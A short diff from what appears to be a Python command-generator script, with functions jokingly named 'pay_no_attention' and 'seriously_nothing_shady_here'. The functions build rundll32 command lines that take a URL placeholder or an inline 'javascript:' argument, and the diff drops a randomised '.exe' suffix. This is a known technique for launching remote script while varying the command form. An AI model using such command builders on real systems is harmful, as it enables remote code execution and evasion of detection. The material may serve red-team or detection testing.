@@ -36,8 +36,6 @@ def pay_no_attention():
 
     coin = [True,False]
     command = "rundll32"
-    if random.choice(coin):
-        command += ".exe"
     command += " ~URL~"
 
     dotpath = []
@@ -81,8 +79,6 @@ def seriously_nothing_shady_here():
 
     coin = [True,False]
     command = "rundll32"
-    if random.choice(coin):
-        command += ".exe"
     command += " javascript:\""
 
     dotpath = []
